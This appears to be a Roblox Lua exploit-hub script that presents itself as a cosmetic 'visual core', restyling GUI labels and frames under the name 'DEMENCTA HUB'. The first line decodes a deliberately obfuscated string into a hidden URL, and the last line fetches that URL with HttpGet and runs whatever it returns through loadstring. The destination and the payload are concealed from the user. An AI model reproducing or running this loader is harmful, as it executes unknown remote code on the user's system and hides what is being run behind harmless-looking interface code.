
--[[ STAGE 2: VISUAL CORE ]]
local SHN8Pd3Zx34rB9="\039\055\051\051\058\193\198\194\013\056\030\213\022\016\099\027\104\025\112\126\104\121\114\066\065\087\064\085\091\029\082\162\160\106\169\178\177\168\184\188\128\184\137\158\139\090\149\225\228\230\234\250\236\255\251\130\192\248\204\213\158\253\208\042\222\201\032\055\040\040\002\060\062\216\021\030\008\029\020\103\030\044\102\016\120\104\121\079\072\076\070\107\088\073\086\173\119\109\124\117\122\170\162\130\136\137\130\140\142\160\144\161\157\176\176\225\237\189\251\204\252"local KmVbdf9vPrImWFQKATu46=166 local SOXl3VoSTM_4G=248 local WlEzVl053o6r=1 local rQJ7pZmyysrDjCxoikP=4 local WRd_j8DSWERurNahp9kch=29 local T4rnnff70hYVuRquv=false local slTLEs9vG2FCl3jdPK=bit32 and bit32.bxor if not slTLEs9vG2FCl3jdPK then slTLEs9vG2FCl3jdPK=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Pe5pPPHx8ABRV5kefHiG={}for Br5KgdHflCVgH=1,#SHN8Pd3Zx34rB9 do local plIAavRCVH_I53F=string.byte(SHN8Pd3Zx34rB9,Br5KgdHflCVgH)local e8YW1KPT7b4PTc741P=(SOXl3VoSTM_4G+(Br5KgdHflCVgH*rQJ7pZmyysrDjCxoikP)+WRd_j8DSWERurNahp9kch)%256 if WlEzVl053o6r==0 then plIAavRCVH_I53F=(plIAavRCVH_I53F-e8YW1KPT7b4PTc741P)%256 Pe5pPPHx8ABRV5kefHiG[Br5KgdHflCVgH]=string.char(slTLEs9vG2FCl3jdPK(plIAavRCVH_I53F,KmVbdf9vPrImWFQKATu46))else plIAavRCVH_I53F=slTLEs9vG2FCl3jdPK(plIAavRCVH_I53F,KmVbdf9vPrImWFQKATu46)Pe5pPPHx8ABRV5kefHiG[Br5KgdHflCVgH]=string.char((plIAavRCVH_I53F-e8YW1KPT7b4PTc741P)%256)end end local S3O992slsVfY0SMiQ89g=table.concat(Pe5pPPHx8ABRV5kefHiG)if T4rnnff70hYVuRquv then S3O992slsVfY0SMiQ89g=string.reverse(S3O992slsVfY0SMiQ89g)end local K_vSU36gJ3NpmxE4QYc9=S3O992slsVfY0SMiQ89g
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(K_vSU36gJ3NpmxE4QYc9))()
